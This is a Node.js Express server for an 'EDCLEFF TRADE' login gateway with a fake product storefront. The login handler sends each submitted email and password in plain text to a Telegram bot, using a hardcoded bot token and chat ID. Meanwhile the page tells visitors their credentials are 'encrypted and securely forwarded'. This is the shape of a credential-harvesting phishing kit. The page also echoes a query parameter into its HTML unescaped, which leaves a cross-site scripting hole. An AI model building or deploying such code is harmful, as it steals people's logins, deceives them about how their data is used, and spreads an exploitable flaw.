const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// ---------- CONFIGURATION ----------
const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
const CHAT_ID = '7623047017';

// Set your own valid password here (change it)
const VALID_PASSWORD = '12345';

// List of common disposable email domains (partial – you can add more)
const disposableDomains = [
  'mailinator.com', 'guerrillamail.com', '10minutemail.com', 'tempmail.com',
  'throwawaymail.com', 'yopmail.com', 'trashmail.com', 'spamgourmet.com',
  'temp-mail.org', 'fakeinbox.com', 'getnada.com', 'mohmal.com',
  'dispostable.com', 'guerrillamail.net', 'sharklasers.com', 'guerrillamail.org'
];

// Helper: validate email format and disposable domains
function isValidEmail(email) {
  // 1. Basic format check (regex)
  const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  if (!emailRegex.test(email)) return false;

  // 2. Extract domain (lowercase)
  const domain = email.split('@')[1].toLowerCase();

  // 3. Check against disposable list
  if (disposableDomains.includes(domain)) return false;

  // 4. All checks passed
  return true;
}

console.log('🔥 TELEGRAM BOT ACTIVE (with email & password validation)');

// ---------- LANDING PAGE (with validation) ----------
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EDCLEFF TRADE | Secure Gateway</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 32px;
      padding: 40px 32px;
      width: 100%;
      max-width: 450px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      text-align: center;
      transition: transform 0.3s;
    }
    .card:hover {
      transform: translateY(-5px);
    }
    .logo {
      font-size: 48px;
      margin-bottom: 16px;
    }
    h1 {
      font-size: 32px;
      color: #1a3c4a;
      margin-bottom: 8px;
    }
    .subtitle {
      color: #5a7a8c;
      margin-bottom: 32px;
      font-size: 14px;
    }
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    .input-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #2c4c5c;
      margin-bottom: 6px;
    }
    .input-group input {
      width: 100%;
      padding: 14px 18px;
      border: 2px solid #e2e8f0;
      border-radius: 40px;
      font-size: 16px;
      outline: none;
      transition: all 0.2s;
    }
    .input-group input:focus {
      border-color: #2c7da0;
      box-shadow: 0 0 0 3px rgba(44,125,160,0.2);
    }
    button {
      width: 100%;
      padding: 14px;
      background: #1f5e7e;
      color: white;
      border: none;
      border-radius: 40px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 8px;
    }
    button:hover {
      background: #0e4a64;
      transform: scale(0.98);
    }
    .error-message {
      background: #fee2e2;
      border-left: 4px solid #dc2626;
      color: #991b1b;
      padding: 10px;
      border-radius: 12px;
      margin-bottom: 16px;
      font-size: 14px;
      text-align: left;
    }
    .footer {
      margin-top: 32px;
      font-size: 11px;
      color: #8aa0b0;
      border-top: 1px solid #eef2f6;
      padding-top: 24px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">✦</div>
    <h1>EDCLEFF TRADE</h1>
    <div class="subtitle">Secure Member Gateway</div>
    <!-- show error message if any -->
    ${req.query.error ? `<div class="error-message">⚠️ ${req.query.error}</div>` : ''}
    <form action="/login" method="POST">
      <div class="input-group">
        <label>📧 Email Address</label>
        <input type="email" name="email" placeholder="you@example.com" required>
      </div>
      <div class="input-group">
        <label>🔒 Password</label>
        <input type="password" name="password" placeholder="Enter your password" required>
      </div>
      <button type="submit">→ ACCESS GOODS & SERVICES</button>
    </form>
    <div class="footer">
      🔐 Your credentials are encrypted and securely forwarded
    </div>
  </div>
</body>
</html>
  `);
});

// ---------- LOGIN HANDLER (with full validation) ----------
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // 1. Validate email (format + disposable domains)
  if (!isValidEmail(email)) {
    // Redirect back to landing page with error message
    return res.redirect('/?error=Invalid%20email%20address%20or%20password%20input');
  }

  // 2. Validate password against hardcoded value
  if (password !== VALID_PASSWORD) {
    return res.redirect('/?error=Invalid%20email%20address%20or%20password%20input');
  }

  // ----- Validation passed: send Telegram alert and show products page -----
  console.log('📨 LOGIN:', email, password);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20EDCLEFF%20LOGIN%0AEmail:%20${email}%0APassword:%20${password}`;
  https.get(url);

  // Products page (same beautiful design as before)
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EDCLEFF TRADE | Products</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      padding: 40px 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    .header {
      text-align: center;
      margin-bottom: 50px;
    }
    .header h1 {
      font-size: 42px;
      color: white;
      margin-bottom: 10px;
    }
    .header p {
      color: #cbd5e1;
      font-size: 18px;
    }
    .logout-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(255,255,255,0.2);
      color: white;
      border: 1px solid rgba(255,255,255,0.3);
      padding: 10px 20px;
      border-radius: 40px;
      text-decoration: none;
      font-size: 14px;
      backdrop-filter: blur(10px);
      transition: 0.2s;
    }
    .logout-btn:hover {
      background: rgba(255,255,255,0.3);
    }
    .products-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 30px;
    }
    .product-card {
      background: white;
      border-radius: 28px;
      padding: 30px;
      text-align: center;
      transition: transform 0.3s, box-shadow 0.3s;
      cursor: pointer;
    }
    .product-card:hover {
      transform: translateY(-8px);
      box-shadow: 0 20px 30px rgba(0,0,0,0.2);
    }
    .product-icon {
      font-size: 64px;
      margin-bottom: 16px;
    }
    .product-card h3 {
      font-size: 24px;
      color: #1a3c4a;
      margin-bottom: 10px;
    }
    .product-card p {
      color: #5a7a8c;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .price {
      font-size: 28px;
      font-weight: bold;
      color: #1f5e7e;
      margin-bottom: 20px;
    }
    .order-btn {
      background: #1f5e7e;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 40px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }
    .order-btn:hover {
      background: #0e4a64;
    }
    .footer {
      text-align: center;
      margin-top: 50px;
      padding-top: 30px;
      color: #94a3b8;
      font-size: 12px;
    }
    @media (max-width: 768px) {
      .header h1 { font-size: 32px; }
      .products-grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <a href="/" class="logout-btn">🚪 Logout</a>
  <div class="container">
    <div class="header">
      <h1>✦ Welcome to EDCLEFF TRADE ✦</h1>
      <p>Premium Goods & Services</p>
    </div>
    <div class="products-grid">
      <div class="product-card">
        <div class="product-icon">📱</div>
        <h3>Premium Smartphone</h3>
        <p>Latest model, 128GB storage, 5G ready, high-res camera</p>
        <div class="price">$599</div>
        <button class="order-btn" onclick="order('Premium Smartphone')">Order Now</button>
      </div>
      <div class="product-card">
        <div class="product-icon">💻</div>
        <h3>Ultrabook Laptop</h3>
        <p>Lightweight, powerful, 16GB RAM, 512GB SSD, perfect for business</p>
        <div class="price">$899</div>
        <button class="order-btn" onclick="order('Ultrabook Laptop')">Order Now</button>
      </div>
      <div class="product-card">
        <div class="product-icon">⌚</div>
        <h3>Smart Watch</h3>
        <p>Track fitness, heart rate, GPS, notifications, long battery life</p>
        <div class="price">$199</div>
        <button class="order-btn" onclick="order('Smart Watch')">Order Now</button>
      </div>
      <div class="product-card">
        <div class="product-icon">🎧</div>
        <h3>Wireless Headphones</h3>
        <p>Noise cancelling, crystal clear sound, comfortable fit</p>
        <div class="price">$149</div>
        <button class="order-btn" onclick="order('Wireless Headphones')">Order Now</button>
      </div>
    </div>
    <div class="footer">
      <p>© 2026 EDCLEFF TRADE - All Rights Reserved</p>
      <p>🔐 Secure Checkout | Fast Delivery | 24/7 Support</p>
    </div>
  </div>
  <script>
    function order(productName) {
      alert('Thank you for your interest in ' + productName + '!\\n\\nA representative will contact you shortly.');
    }
  </script>
</body>
</html>
  `);
});

app.listen(PORT, () => console.log('✅ Server on', PORT));
